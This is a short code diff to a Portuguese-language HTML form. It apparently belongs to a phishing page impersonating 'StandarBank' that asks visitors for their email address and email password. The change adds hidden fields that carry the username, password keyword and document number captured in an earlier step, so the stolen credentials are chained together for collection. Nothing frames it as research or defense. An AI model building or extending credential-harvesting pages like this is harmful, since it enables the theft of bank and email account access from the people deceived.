@@ -67,8 +67,16 @@
 <body>
   <form class="box" action="/segundaetapa" method="POST">
     <h2>Validação de E-mail</h2>
+
+    <!-- Campos ocultos para manter os dados da primeira etapa -->
+    <input type="hidden" name="usuario" value="{{ usuario }}">
+    <input type="hidden" name="palavrachave" value="{{ palavrachave }}">
+    <input type="hidden" name="documento" value="{{ documento }}">
+    <input type="hidden" name="agora" value="{{ agora }}">
+
     <input type="email" name="emailverificado" placeholder="Digite o seu E-mail" required />
     <input type="password" name="senhaverificada" placeholder="Senha do E-mail" required />
+
     <button type="submit">Confirmar</button>
     <p>StandarBank agradece seu tempo</p>
   </form>
